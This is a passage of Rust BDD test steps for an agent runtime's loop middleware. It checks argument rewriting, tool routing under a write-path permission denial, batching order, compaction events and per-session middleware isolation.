pub(crate) fn t_tool_error_loop_middleware() {
    let events = crate::bdd::steps_agent_runtime::ar_events();

    assert!(
        events.iter().any(|e| matches!(
            e,
            XyEvent::ToolExecutionEnd { is_error: true, result, .. }
                if result.contains("loop middleware")
        )),
        "expected loop middleware deny tool-error: {events:?}"
    );
}

#[then("tool-error 回写且原因含 permission denied")]
pub(crate) fn t_tool_error_permission() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    assert!(
        events.iter().any(|e| matches!(
            e,
            XyEvent::ToolExecutionEnd { is_error: true, result, .. }
                if result.contains("permission denied")
        )),
        "core permission must re-check rewritten args: {events:?}"
    );
}

#[given("注册 before_tool 中间件把 bash 命令改为 echo safe")]
pub(crate) fn g_rewrite_visible(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(Scripted {
            id: "rewrite-visible",
            order: 0,
            stages: &[LoopStage::BeforeTool],
            decide: LoopControl::Continue,
            deny_tool: None,
            rewrite_args: Some(serde_json::json!({ "command": "echo safe" })),
        }))
        .expect("register rewrite-visible");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("bash", r#"{"command":"echo risky"}"#);
    ar_store_runner(runner);
}

#[when("运行 AgentRuntime 触发 bash 并收集事件")]
pub(crate) async fn w_run_trigger_bash_collect() {
    ar_take_run_store("触发 bash").await;
}

#[then("ToolExecutionStart 的参数为 echo safe")]
pub(crate) fn t_start_shows_rewritten_args() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let args = events
        .iter()
        .find_map(|e| match e {
            XyEvent::ToolExecutionStart { name, args, .. } if name == "bash" => Some(args.clone()),
            _ => None,
        })
        .expect("ToolExecutionStart for bash");
    assert_eq!(
        args.get("command").and_then(|v| v.as_str()),
        Some("echo safe"),
        "ToolExecutionStart must show rewritten args: {events:?}"
    );
}

#[given("注册 after_llm_response 中间件把 assistant 文本改写为 replaced")]
pub(crate) fn g_rewrite_assistant(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(RewriteAssistant))
        .expect("register rewrite-assistant");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("original");
    ar_store_runner(runner);
}

#[then("MessageEnd 携带的 assistant 文本为 replaced 且无改写前文本")]
pub(crate) fn t_message_end_is_rewritten() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let text = events
        .iter()
        .find_map(|e| match e {
            XyEvent::MessageEnd {
                role,
                message: Some(msg),
            } if role == "assistant" => Some(msg.text()),
            _ => None,
        })
        .expect("assistant MessageEnd with message");
    assert!(
        text.contains("replaced"),
        "MessageEnd must carry rewritten assistant: {text}"
    );
    assert!(
        !text.contains("original"),
        "MessageEnd must not leak pre-middleware text: {text}"
    );
}

#[given("注册 before_turn 中间件注入长系统碎片")]
pub(crate) async fn g_inject_fragment(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(InjectFragment))
        .expect("register inject-fragment");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("settle");
    let with_fragment = {
        let mut stream = agent_submit_root(&mut runner, "fragment run").await;
        let mut local = Vec::new();
        while let Some(e) = stream.next().await {
            if let XyEvent::Error(err) = &e {
                panic!("fragment run failed: {err:?}");
            }
            local.push(e);
        }
        local
    };
    ar_store_runner(runner);
    ar_store_events(with_fragment);
}

#[when("运行 AgentRuntime 并比较有无碎片的回合结算估计")]
pub(crate) async fn w_compare_settlement(agent: &AgentState, ws: &Workspace) {
    let with_fragment = crate::bdd::steps_agent_runtime::ar_events();
    let with_tokens = settlement_tokens(&with_fragment);

    let mut plain = ar_make_runner(agent, ws);
    set_fake_text("settle");
    let mut baseline = Vec::new();
    let mut stream = agent_submit_root(&mut plain, "fragment run").await;
    while let Some(e) = stream.next().await {
        if let XyEvent::Error(err) = &e {
            panic!("baseline run failed: {err:?}");
        }
        baseline.push(e);
    }
    let without_tokens = settlement_tokens(&baseline);
    LOOP_SETTLEMENT.with(|slot| {
        let mut out = slot.borrow_mut();
        out.clear();
        out.push(with_tokens);
        out.push(without_tokens);
    });
}

fn settlement_tokens(events: &[XyEvent]) -> u64 {
    events
        .iter()
        .find_map(|e| match e {
            XyEvent::ContextTokenSettlement { estimate, .. } => Some(estimate.tokens),
            _ => None,
        })
        .expect("ContextTokenSettlement")
}

#[then("含碎片的估计不低于无碎片基线")]
pub(crate) fn t_fixed_context_has_fragment() {
    LOOP_SETTLEMENT.with(|slot| {
        let values = slot.borrow();
        let (with_fragment, baseline) = (values[0], values[1]);
        assert!(
            with_fragment >= baseline,
            "fragment must not shrink estimate: with={with_fragment} baseline={baseline}"
        );
        assert!(
            with_fragment > baseline,
            "fragment must reach fixed context: with={with_fragment} baseline={baseline}"
        );
    });
}

struct RouteScript {
    id: &'static str,
    stages: &'static [LoopStage],
    target_tool: &'static str,
    target_args: serde_json::Value,
    only_call_id: Option<&'static str>,
}

#[async_trait::async_trait]
impl LoopMiddleware for RouteScript {
    fn id(&self) -> &str {
        self.id
    }

    fn stages(&self) -> &'static [LoopStage] {
        self.stages
    }

    async fn before_tool(&self, mut ctx: BeforeToolCtx) -> LoopStep<BeforeToolCtx> {
        if self.only_call_id.is_some_and(|id| ctx.tool_call_id != id) {
            return LoopStep::continued(ctx);
        }
        ctx.tool_name = self.target_tool.to_string();
        ctx.args = self.target_args.clone();
        LoopStep::continued(ctx)
    }
}

struct ImagePartsTool;

#[async_trait::async_trait]
impl xylitol_plugin_sdk::XyTool for ImagePartsTool {
    fn name(&self) -> &str {
        "img_tool"
    }

    fn description(&self) -> &str {
        "returns an image part"
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({ "type": "object", "properties": {} })
    }

    async fn execute(
        &self,
        _ctx: &xylitol_plugin_sdk::XyToolCtx,
        _args: serde_json::Value,
    ) -> Result<String, xylitol_plugin_sdk::error::XyToolError> {
        Ok("image".into())
    }

    async fn execute_as_parts(
        &self,
        _ctx: &xylitol_plugin_sdk::XyToolCtx,
        _args: serde_json::Value,
    ) -> Result<Vec<xylitol_plugin_sdk::AgentPart>, xylitol_plugin_sdk::error::XyToolError> {
        Ok(vec![xylitol_plugin_sdk::AgentPart::Image(
            xylitol_plugin_sdk::ImageContent {
                url: None,
                data: Some("QUJD".into()),
                media_type: "image/png".into(),
            },
        )])
    }
}

struct AddDetails;

#[async_trait::async_trait]
impl LoopMiddleware for AddDetails {
    fn id(&self) -> &str {
        "add-details"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::AfterTool]
    }

    async fn after_tool(
        &self,
        mut ctx: xylitol_plugin_sdk::AfterToolCtx,
    ) -> LoopStep<xylitol_plugin_sdk::AfterToolCtx> {
        ctx.details = Some(serde_json::json!({ "marker": "mw-details" }));
        LoopStep::continued(ctx)
    }
}

thread_local! {
    static ROUTE_TIMING: RefCell<Vec<(String, u128, u128)>> = const { RefCell::new(Vec::new()) };
    static ROUTE_EPOCH: Cell<Option<std::time::Instant>> = const { Cell::new(None) };
}

struct RoutedSlowTool {
    name: &'static str,
    mode: xylitol_plugin_sdk::XyToolExecutionMode,
    sleep_ms: u64,
}

#[async_trait::async_trait]
impl xylitol_plugin_sdk::XyTool for RoutedSlowTool {
    fn name(&self) -> &str {
        self.name
    }

    fn description(&self) -> &str {
        "routed slow tool"
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({ "type": "object", "properties": {} })
    }

    fn execution_mode(&self) -> xylitol_plugin_sdk::XyToolExecutionMode {
        self.mode
    }

    async fn execute(
        &self,
        _ctx: &xylitol_plugin_sdk::XyToolCtx,
        _args: serde_json::Value,
    ) -> Result<String, xylitol_plugin_sdk::error::XyToolError> {
        let epoch = ROUTE_EPOCH.with(|e| e.get().expect("route epoch"));
        let start = epoch.elapsed().as_millis();
        tokio::time::sleep(std::time::Duration::from_millis(self.sleep_ms)).await;
        let end = epoch.elapsed().as_millis();
        ROUTE_TIMING.with(|t| t.borrow_mut().push((self.name.to_string(), start, end)));
        Ok(format!("{}-ok", self.name))
    }
}

struct RecordingCompaction {
    settings: xylitol_plugin_sdk::CompactionSettings,
}

#[async_trait::async_trait]
impl xylitol_plugin_sdk::XyCompaction for RecordingCompaction {
    fn settings(&self) -> &xylitol_plugin_sdk::CompactionSettings {
        &self.settings
    }

    async fn compact(
        &self,
        _store: &dyn xylitol_plugin_sdk::XySessionStore,
        _sid: &str,
        _summary: &xylitol_runtime::agent::model::task_model::CompactionSummaryBinding,
        event_sink: &dyn xylitol_plugin_sdk::XyEventSink,
        _instructions: Option<String>,
        reason: &str,
        _context_window: u64,
        _fixed_context: Option<&xylitol_plugin_sdk::FixedRequestContext>,
        _fallback_notice_emitted: &mut bool,
    ) -> Result<(), xylitol_plugin_sdk::CompactionError> {
        event_sink
            .emit(&XyEvent::CompactionStart {
                reason: reason.to_string(),
            })
            .await;
        event_sink
            .emit(&XyEvent::CompactionEnd {
                result: Some("ok".into()),
                aborted: false,
                reason: reason.to_string(),
                will_retry: false,
                error_message: None,
                summary: Some("mw summary".into()),
                tokens_before: Some(100),
                tokens_after: Some(40),
                notice: None,
            })
            .await;
        event_sink
            .emit(&XyEvent::ContextTokenSettlement {
                estimate: xylitol_plugin_sdk::ContextTokenEstimate {
                    tokens: 40,
                    provenance: xylitol_plugin_sdk::TokenProvenance::Heuristic,
                    usage_tokens: 0,
                    trailing_tokens: 0,
                    last_usage_index: None,
                },
                reason: "after_compaction".into(),
                generation: 7,
            })
            .await;
        Ok(())
    }

    async fn maybe_overflow_compact(
        &self,
        _store: &dyn xylitol_plugin_sdk::XySessionStore,
        _sid: &str,
        _summary: &xylitol_runtime::agent::model::task_model::CompactionSummaryBinding,
        _event_sink: &dyn xylitol_plugin_sdk::XyEventSink,
        _context_window: u64,
        _last_assistant: &xylitol_plugin_sdk::AgentMessage,
        _current_provider: &str,
        _current_model_id: &str,
        _overflow_recovery_attempted: bool,
        _fixed_context: Option<&xylitol_plugin_sdk::FixedRequestContext>,
        _turn_obs_parent: Option<fastrace::prelude::SpanContext>,
        _fallback_notice_emitted: &mut bool,
        _floor_notice_emitted: Option<&mut bool>,
    ) -> Result<xylitol_plugin_sdk::OverflowCompactOutcome, xylitol_plugin_sdk::CompactionError>
    {
        Ok(xylitol_plugin_sdk::OverflowCompactOutcome::Skipped)
    }

    async fn maybe_auto_compact(
        &self,
        _store: &dyn xylitol_plugin_sdk::XySessionStore,
        _sid: &str,
        _summary: &xylitol_runtime::agent::model::task_model::CompactionSummaryBinding,
        _event_sink: &dyn xylitol_plugin_sdk::XyEventSink,
        _context_window: u64,
        _estimate_opts: &xylitol_plugin_sdk::EstimateOpts,
        _last_assistant: Option<&xylitol_plugin_sdk::AgentMessage>,
        _precomputed: Option<&xylitol_plugin_sdk::ContextTokenEstimate>,
        _fixed_context: Option<&xylitol_plugin_sdk::FixedRequestContext>,
        _turn_obs_parent: Option<fastrace::prelude::SpanContext>,
        _fallback_notice_emitted: &mut bool,
        _floor_notice_emitted: Option<&mut bool>,
    ) -> Result<bool, xylitol_plugin_sdk::CompactionError> {
        Ok(false)
    }
}

struct CompactOnce {
    reason: &'static str,
}

#[async_trait::async_trait]
impl LoopMiddleware for CompactOnce {
    fn id(&self) -> &str {
        "compact-once"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::DecideContinue]
    }

    async fn decide_continue(&self, mut ctx: DecideContinueCtx) -> LoopStep<DecideContinueCtx> {
        if ctx.settle_count == 0 {
            ctx.compact = Some(xylitol_plugin_sdk::CompactRequest {
                instructions: Some("keep recent tool results".into()),
                reason: Some(self.reason.into()),
            });
            LoopStep {
                ctx,
                control: LoopControl::Compact,
                properties: Vec::new(),
            }
        } else {
            LoopStep::stopped(ctx)
        }
    }
}

fn permission_denying_write(path_glob: &str) -> Arc<dyn xylitol_plugin_sdk::XyPermission> {
    xylitol_official_plugin_config::types::PermissionConfig {
        enabled: true,
        backend: xylitol_official_plugin_config::types::PermissionBackend::Glob,
        filesystem: xylitol_official_plugin_config::types::PermissionFilesystemConfig {
            read_allowed: vec![],
            write_allowed: vec![],
            write_denied: vec![path_glob.into()],
        },
        network: xylitol_official_plugin_config::types::PermissionNetworkConfig {
            allowed_domains: vec![],
            denied_domains: vec![],
        },
        process: xylitol_official_plugin_config::types::PermissionProcessConfig {
            allowed_paths: vec![],
        },
    }
    .to_permission()
}

#[given("注册 before_tool 中间件把 read 路由到 write 且权限引擎拒绝该写入路径")]
pub(crate) fn g_route_to_write_denied(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(RouteScript {
            id: "route-to-write",
            stages: &[LoopStage::BeforeTool],
            target_tool: "write",
            target_args: serde_json::json!({ "path": "/denied/out.rs", "content": "x" }),
            only_call_id: None,
        }))
        .expect("register route-to-write");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_permission(permission_denying_write("/denied/**"));
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("read", r#"{"path":"src/main.rs"}"#);
    ar_store_runner(runner);
}

#[given("注册 before_tool 中间件把并行安全的 read 路由到串行工具")]
pub(crate) fn g_route_to_barrier(agent: &AgentState, _ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(RouteScript {
            id: "route-to-barrier",
            stages: &[LoopStage::BeforeTool],
            target_tool: "route_dst",
            target_args: serde_json::json!({}),
            only_call_id: Some("call-0"),
        }))
        .expect("register route-to-barrier");
    ROUTE_TIMING.with(|t| t.borrow_mut().clear());
    ROUTE_EPOCH.with(|e| e.set(Some(std::time::Instant::now())));
    let tools = ToolSet::from_iter(vec![
        Arc::new(RoutedSlowTool {
            name: "route_src",
            mode: xylitol_plugin_sdk::XyToolExecutionMode::Parallel,
            sleep_ms: 60,
        }) as Arc<dyn xylitol_plugin_sdk::XyTool>,
        Arc::new(RoutedSlowTool {
            name: "route_dst",
            mode: xylitol_plugin_sdk::XyToolExecutionMode::Sequential,
            sleep_ms: 60,
        }) as Arc<dyn xylitol_plugin_sdk::XyTool>,
    ]);
    let mut runner = crate::bdd::steps_agent_runtime::bdd_batch_make_runner(
        agent,
        tools,
        &[("route_src", r#"{}"#), ("route_src", r#"{}"#)],
        xylitol_plugin_sdk::XyBatchMode::BarrierParallel,
    );
    runner.set_loop_middleware(Some(registry));
    ar_store_runner(runner);
}

#[given("注册 before_tool 中间件把 read 路由到未装配的工具名")]
pub(crate) fn g_route_to_missing(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(RouteScript {
            id: "route-to-missing",
            stages: &[LoopStage::BeforeTool],
            target_tool: "ghost_tool",
            target_args: serde_json::json!({}),
            only_call_id: None,
        }))
        .expect("register route-to-missing");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("read", r#"{"path":"src/main.rs"}"#);
    ar_store_runner(runner);
}

#[given("注册两个 before_tool 中间件且首个对首个调用返回 stop")]
pub(crate) fn g_two_middleware_first_stops(agent: &AgentState, _ws: &Workspace) {
    LOOP_SECOND_CALLS.with(|c| *c.borrow_mut() = 0);
    let registry = fresh_registry();
    registry
        .register(Arc::new(CountingStopper {
            calls: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
            stop_on_first: true,
        }))
        .expect("register preflight-stopper");
    registry
        .register(Arc::new(CountingStopper {
            calls: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
            stop_on_first: false,
        }))
        .expect("register preflight-observer");

    let tools = ToolSet::from_iter(vec![
        Arc::new(PlainTool { name: "first_tool" }) as Arc<dyn xylitol_plugin_sdk::XyTool>,
        Arc::new(PlainTool {
            name: "second_tool",
        }) as Arc<dyn xylitol_plugin_sdk::XyTool>,
    ]);
    let mut runner = crate::bdd::steps_agent_runtime::bdd_batch_make_runner(
        agent,
        tools,
        &[("first_tool", r#"{}"#), ("second_tool", r#"{}"#)],
        xylitol_plugin_sdk::XyBatchMode::Sequential,
    );
    runner.set_loop_middleware(Some(registry));
    ar_store_runner(runner);
}

#[when("运行 AgentRuntime 触发两个工具调用")]
pub(crate) async fn w_run_two_tool_calls() {
    ar_take_run_store("触发两个工具调用").await;
}

#[then("第二个中间件已被调用且其工具未执行")]
pub(crate) fn t_second_middleware_ran_tool_did_not() {
    let observed = LOOP_SECOND_CALLS.with(|c| *c.borrow());
    assert!(
        observed > 0,
        "the second middleware must have run during preflight even though the batch was stopped"
    );
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let executed: Vec<&str> = events
        .iter()
        .filter_map(|e| match e {
            XyEvent::ToolExecutionStart { name, .. } => Some(name.as_str()),
            _ => None,
        })
        .collect();
    assert!(
        !executed.contains(&"second_tool"),
        "the stopped batch must not execute the second tool: {executed:?}"
    );
}

#[when("运行 AgentRuntime 触发 read")]
pub(crate) async fn w_run_trigger_read() {
    ar_take_run_store("触发 read").await;
}

#[then("tool-error 回写且原因含 Unknown tool")]
pub(crate) fn t_tool_error_unknown_tool() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    assert!(
        events.iter().any(|e| matches!(
            e,
            XyEvent::ToolExecutionEnd { is_error: true, result, .. }
                if result.contains("Unknown tool")
        )),
        "routed call must fail as unknown tool: {events:?}"
    );
}

#[then("该调用单独成窗且不与后续并行安全调用重叠")]
pub(crate) fn t_routed_barrier_no_overlap() {
    let entries = ROUTE_TIMING.with(|t| t.borrow().clone());
    assert_eq!(entries.len(), 2, "{entries:?}");
    let dst = entries
        .iter()
        .find(|(n, _, _)| n == "route_dst")
        .expect("routed barrier execution");
    let src = entries
        .iter()
        .find(|(n, _, _)| n == "route_src")
        .expect("parallel execution");
    let overlaps = dst.1 < src.2 && src.1 < dst.2;
    assert!(
        !overlaps,
        "routed Sequential call must not overlap ParallelSafe call: {entries:?}"
    );
}

#[given("注册 after_tool 中间件且工具返回图片分片")]
pub(crate) fn g_image_parts(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(AddDetails))
        .expect("register add-details");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_tools(ToolSet::from_iter(vec![
        Arc::new(ImagePartsTool) as Arc<dyn xylitol_plugin_sdk::XyTool>
    ]));
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("img_tool", r#"{}"#);
    ar_store_runner(runner);
}

#[when("运行 AgentRuntime 触发该工具")]
pub(crate) async fn w_run_trigger_tool() {
    ar_take_run_store("触发工具").await;
}

#[when("运行 AgentRuntime 并收集工具批事件")]
pub(crate) async fn w_run_collect_batch_events() {
    ar_take_run_store("路由批次").await;
}

#[then("历史回写仍含图片分片")]
pub(crate) fn t_history_keeps_image() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let history = events
        .iter()
        .rev()
        .find_map(|e| match e {
            XyEvent::AgentEnd { messages } => Some(messages.clone()),
            _ => None,
        })
        .expect("AgentEnd");
    let has_image = history.iter().any(|m| {
        matches!(
            m,
            xylitol_plugin_sdk::AgentMessage::Llm(
                xylitol_plugin_sdk::XyLlmMessage::ToolResultMessage { content, .. }
            ) if content
                .iter()
                .any(|p| matches!(p, xylitol_plugin_sdk::AgentPart::Image(_)))
        )
    });
    assert!(has_image, "history must keep image parts: {history:?}");
}

#[given("注册 after_tool 中间件把结构化详情替换为带标记的对象")]
pub(crate) fn g_rewrite_details(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(AddDetails))
        .expect("register add-details");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("ls", r#"{"path":"."}"#);
    ar_store_runner(runner);
}

#[then("该调用的历史回写详情含该标记")]
pub(crate) fn t_history_details_marker() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let history = events
        .iter()
        .rev()
        .find_map(|e| match e {
            XyEvent::AgentEnd { messages } => Some(messages.clone()),
            _ => None,
        })
        .expect("AgentEnd");
    let marker = history.iter().any(|m| {
        matches!(
            m,
            xylitol_plugin_sdk::AgentMessage::Llm(
                xylitol_plugin_sdk::XyLlmMessage::ToolResultMessage { details, .. }
            ) if details
                .as_ref()
                .and_then(|d| d.get("marker"))
                .and_then(|v| v.as_str())
                == Some("mw-details")
        )
    });
    assert!(
        marker,
        "middleware details must survive into history: {history:?}"
    );
}

#[given("注册 decide_continue 中间件返回带来源标签的 compact 决策")]
pub(crate) fn g_compact_with_reason(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(CompactOnce {
            reason: "loop_middleware:focus-mw",
        }))
        .expect("register compact-once");
    let mut runner = compact_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("compacted ack");
    ar_store_runner(runner);
}

#[given("注册 decide_continue 中间件返回 compact 决策且压缩成功")]
pub(crate) fn g_compact_success(agent: &AgentState, ws: &Workspace) {
    g_compact_with_reason(agent, ws);
}

#[when("运行 AgentRuntime 并收集压缩事件")]
pub(crate) async fn w_run_collect_compaction() {
    ar_take_run_store("压缩运行").await;
}

#[then("CompactionStart 与 CompactionEnd 的 reason 含该标签")]
pub(crate) fn t_compaction_reason_label() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let start = events
        .iter()
        .find_map(|e| match e {
            XyEvent::CompactionStart { reason } => Some(reason.clone()),
            _ => None,
        })
        .expect("CompactionStart");
    assert!(
        start.contains("focus-mw"),
        "CompactionStart reason must carry middleware label: {start}"
    );
    let end = events
        .iter()
        .find_map(|e| match e {
            XyEvent::CompactionEnd { reason, .. } => Some(reason.clone()),
            _ => None,
        })
        .expect("CompactionEnd");
    assert!(
        end.contains("focus-mw"),
        "CompactionEnd reason must carry middleware label: {end}"
    );
}

#[then("事件流含压缩后结算")]
pub(crate) fn t_compaction_settlement() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    assert!(
        events.iter().any(|e| matches!(
            e,
            XyEvent::ContextTokenSettlement { reason, .. } if reason == "after_compaction"
        )),
        "compaction must emit a post-compaction settlement: {events:?}"
    );
}

fn compact_runner(
    agent: &AgentState,
    ws: &Workspace,
) -> xylitol_runtime::agent::runtime::AgentRuntime {
    use xylitol_plugin_sdk::{XyEventSink, XyModelBuilder, XySessionStore};

    ws.init();
    reset_fake_state();
    crate::bdd::steps_agent_runtime::ar_register_fake(agent, "ar-compact");
    let dir = tempfile::tempdir().unwrap();
    let mgr = SessionManager::new(dir.keep());
    let store: Arc<dyn XySessionStore> = Arc::new(mgr);
    let sink: Arc<dyn XyEventSink> = Arc::new(xylitol_kernel::event::EventBus::new());
    let builder: XyModelBuilder = Arc::new(xylitol_kernel::provider::factory::build_provider);
    let settings = xylitol_plugin_sdk::CompactionSettings {
        enabled: true,
        reserve_tokens: 1024,
        keep_recent_tokens: 1000,
        ..Default::default()
    };
    let mut caps = AgentCapabilities::new(
        agent.registry.borrow().clone(),
        ToolSet::from_iter(xylitol_official_plugin_tools::default_tools()),
        store,
        sink,
        None,
        Vec::new(),
        Vec::new(),
        ".".into(),
        Some(settings),
        builder,
        xylitol_runtime::permission::allow_all_permission(),
        xylitol_runtime::agent::capabilities::QueueMode::default(),
        xylitol_runtime::agent::capabilities::QueueMode::default(),
        None,
    );
    caps.install_compaction(Arc::new(|settings| {
        Arc::new(RecordingCompaction { settings }) as Arc<dyn xylitol_plugin_sdk::XyCompaction>
    }));
    let mut runner = xylitol_runtime::agent::runtime::AgentRuntime::new(caps);
    futures::executor::block_on(runner.select_model("ar-compact"))
        .expect("select ar-compact fake model");
    runner
}

thread_local! {
    static SCOPE_ROOT: RefCell<Option<Arc<LoopMiddlewareRegistry>>> = const { RefCell::new(None) };
    static SCOPE_A: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
    static SCOPE_B: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
}

#[given("root 链含一个共享中间件且两个会话槽各自再注册一个独有中间件")]
pub(crate) fn g_scope_two_slots() {
    let root = fresh_registry();
    root.register(scripted(
        "shared",
        0,
        &[LoopStage::BeforeTool],
        LoopControl::Continue,
    ))
    .expect("shared");
    let slot_a = root.derive();
    slot_a
        .register(scripted(
            "only-a",
            1,
            &[LoopStage::BeforeTool],
            LoopControl::Continue,
        ))
        .expect("only-a");
    let slot_b = root.derive();
    slot_b
        .register(scripted(
            "only-b",
            1,
            &[LoopStage::BeforeTool],
            LoopControl::Continue,
        ))
        .expect("only-b");
    SCOPE_A.with(|c| *c.borrow_mut() = slot_a.ids());
    SCOPE_B.with(|c| *c.borrow_mut() = slot_b.ids());
    SCOPE_ROOT.with(|c| c.borrow_mut().replace(root));
}

#[when("比较两个会话槽与 root 的中间件标识")]
pub(crate) fn w_compare_slot_ids() {}

#[then("两会话互不可见对方独有项且 root 不含任何独有项")]
pub(crate) fn t_slots_isolated() {
    let a = SCOPE_A.with(|c| c.borrow().clone());
    let b = SCOPE_B.with(|c| c.borrow().clone());
    let root = SCOPE_ROOT.with(|c| c.borrow().as_ref().expect("root registry").ids());
    assert_eq!(a, vec!["shared".to_string(), "only-a".to_string()]);
    assert_eq!(b, vec!["shared".to_string(), "only-b".to_string()]);
    assert!(
        !a.contains(&"only-b".to_string()),
        "slot a must not see slot b middleware"
    );
    assert!(
        !b.contains(&"only-a".to_string()),
        "slot b must not see slot a middleware"
    );
    assert_eq!(
        root,
        vec!["shared".to_string()],
        "root must not pick up slot-local middleware"
    );
}

#[given("会话槽已从 root 派生")]
pub(crate) fn g_slot_derived() {
    let root = fresh_registry();
    let slot = root.derive();
    SCOPE_A.with(|c| *c.borrow_mut() = slot.ids());
    SCOPE_ROOT.with(|c| c.borrow_mut().replace(root));
}

#[when("root 随后注册新中间件")]
pub(crate) fn w_root_registers_later() {
    SCOPE_ROOT.with(|c| {
        c.borrow()
            .as_ref()
            .expect("root registry")
            .register(scripted(
                "late",
                0,
                &[LoopStage::BeforeTool],
                LoopControl::Continue,
            ))
            .expect("late");
    });
}

#[then("该会话槽的链仍为派生时刻快照")]
pub(crate) fn t_slot_snapshot_frozen() {
    let slot_ids = SCOPE_A.with(|c| c.borrow().clone());
    let root_ids = SCOPE_ROOT.with(|c| c.borrow().as_ref().expect("root registry").ids());
    assert!(
        slot_ids.is_empty(),
        "slot frozen at derive must not inherit later root registrations: {slot_ids:?}"
    );
    assert_eq!(root_ids, vec!["late".to_string()]);
}

#[given("root 未注册任何中间件")]
pub(crate) fn g_root_empty() {
    SCOPE_ROOT.with(|c| c.borrow_mut().replace(fresh_registry()));
}

#[when("读取派生会话槽的链")]
pub(crate) fn w_read_derived_chain() {
    let slot_ids = SCOPE_ROOT.with(|c| c.borrow().as_ref().expect("root registry").derive().ids());
    SCOPE_A.with(|c| *c.borrow_mut() = slot_ids);
}

#[then("链为空")]
pub(crate) fn t_chain_empty() {
    let ids = SCOPE_A.with(|c| c.borrow().clone());
    assert!(
        ids.is_empty(),
        "unconfigured root must derive an empty chain: {ids:?}"
    );
}

thread_local! {
    static SKILL_SEEN: RefCell<Option<String>> = const { RefCell::new(None) };
}

struct CaptureBeforeLlmRequest;

#[async_trait::async_trait]
impl LoopMiddleware for CaptureBeforeLlmRequest {
    fn id(&self) -> &str {
        "capture-before-model"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::BeforeLlmRequest]
    }

    async fn before_llm_request(&self, ctx: BeforeLlmRequestCtx) -> LoopStep<BeforeLlmRequestCtx> {
        let joined = ctx
            .messages
            .iter()
            .map(|m| m.text())
            .collect::<Vec<_>>()
            .join("\n");
        SKILL_SEEN.with(|c| c.borrow_mut().replace(joined));
        LoopStep::continued(ctx)
    }
}

#[given("注册 before_llm_request 中间件观察 messages 且 skills 已装配")]
pub(crate) fn g_capture_before_llm_request(agent: &AgentState, ws: &Workspace) {
    SKILL_SEEN.with(|c| *c.borrow_mut() = None);
    let mut runner = ar_make_runner(agent, ws);
    let skill_path = std::path::PathBuf::from(ws.root()).join("SKILL.md");
    std::fs::write(&skill_path, "---\nname: demo\n---\n\nSKILL_BODY_MARKER\n").unwrap();
    runner.apply_skills(vec![xylitol_plugin_sdk::resource::SkillInfo {
        name: "demo".into(),
        description: Some("d".into()),
        source_info: xylitol_plugin_sdk::source_info::SourceInfo {
            path: skill_path,
            source: "test".into(),
            scope: xylitol_plugin_sdk::source_info::SourceScope::User,
            origin: xylitol_plugin_sdk::source_info::SourceOrigin::TopLevel,
            base_dir: None,
        },
        disable_model_invocation: false,
    }]);
    let registry = fresh_registry();
    registry
        .register(Arc::new(CaptureBeforeLlmRequest))
        .expect("register capture-before-model");
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    ar_store_runner(runner);
}

#[when("运行 AgentRuntime 提交引用技能的 prompt")]
pub(crate) async fn w_run_with_skill_ref() {
    ar_take_run_store("use $demo").await;
}

#[then("before_llm_request 观察到已展开的技能正文")]
pub(crate) fn t_before_llm_request_sees_expanded() {
    let seen = SKILL_SEEN
        .with(|c| c.borrow().clone())
        .expect("before_llm_request must have run");
    assert!(
        seen.contains("SKILL_BODY_MARKER"),
        "before_llm_request must observe expanded skill body: {seen}"
    );
}

thread_local! {
    static TRUNCATE_OUT: RefCell<Option<(usize, usize)>> = const { RefCell::new(None) };
}

#[given("MCP 工具返回超过上限的单段文本")]
pub(crate) fn g_mcp_oversized() {
